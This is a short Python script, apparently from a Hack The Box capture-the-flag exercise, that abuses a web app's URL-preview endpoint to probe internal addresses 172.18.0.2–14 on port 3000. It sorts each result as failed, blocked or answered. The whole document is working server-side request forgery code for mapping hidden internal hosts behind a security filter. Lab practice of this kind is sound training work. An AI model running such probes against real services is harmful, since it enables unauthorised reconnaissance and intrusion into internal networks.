import requests

for i in range(2, 15):
    ip = f"172.18.0.{i}"
    u = f"http://{ip}:3000/x.yaml"
    r = requests.post("http://nimbus.htb/jobs/preview", data={"url": u}, timeout=8)
    body = r.text
    if "Could not fetch" in body:
        verdict = "CONN_FAILED"
    elif "Security policy" in body:
        verdict = "BLOCKED"
    else:
        verdict = "RESPONSE"
    print(f"{ip}:3000 -> {verdict}")
